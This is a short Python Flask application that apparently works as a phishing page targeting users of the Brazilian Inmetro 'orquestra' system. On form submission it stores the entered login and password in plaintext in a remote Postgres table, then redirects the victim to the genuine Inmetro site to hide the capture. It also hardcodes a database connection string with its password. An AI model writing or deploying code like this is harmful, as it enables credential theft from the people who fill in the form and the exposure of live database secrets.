from flask import Flask, render_template, request, redirect
import psycopg2 as pg
import os

app = Flask(__name__)

@app.route('/')
def index():
  return render_template('index.html')


@app.route('/', methods=['POST'])
def login():
    login = request.form['Login']
    senha = request.form['Password']

    db_url = "postgres://default:vjIrwA8RoXB2@ep-frosty-sun-259138.us-east-1.postgres.vercel-storage.com:5432/verceldb"

    # Configurar a conexão com o banco de dados
    conn = pg.connect(db_url)

    # Criar um cursor para executar as operações no banco de dados
    cursor = conn.cursor()

    # Executar a inserção dos dados na tabela desejada
    cursor.execute("INSERT INTO dados (login, senha) VALUES (%s, %s)", (login, senha))

    # Confirmar a transação
    conn.commit()

    # Fechar o cursor e a conexão com o banco de dados
    cursor.close()
    conn.close()

    # Exibir mensagem de log
    app.logger.info('Login e senha enviados com sucesso!')

    # Redirecionar para um site após a inserção no banco de dados
    return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')

if __name__ == '__main__':
  app.run(port=5000)
